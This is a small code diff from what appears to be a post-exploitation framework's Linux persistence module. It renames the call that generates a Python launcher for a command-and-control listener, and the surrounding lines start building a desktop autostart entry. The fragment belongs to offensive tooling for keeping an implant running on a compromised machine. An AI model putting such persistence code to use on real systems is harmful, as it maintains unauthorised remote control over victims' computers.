@@ -83,7 +83,7 @@ class Module:
         remove = self.options['Remove']['Value']
         fileName = self.options['FileName']['Value']
         listenerName = self.options['Listener']['Value']
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='python')
+        launcher = self.mainMenu.payloads.generate_launcher(listenerName, language='python')
         launcher = launcher.strip('echo').strip(' | /usr/bin/python &')
         dtSettings = """
 [Desktop Entry]
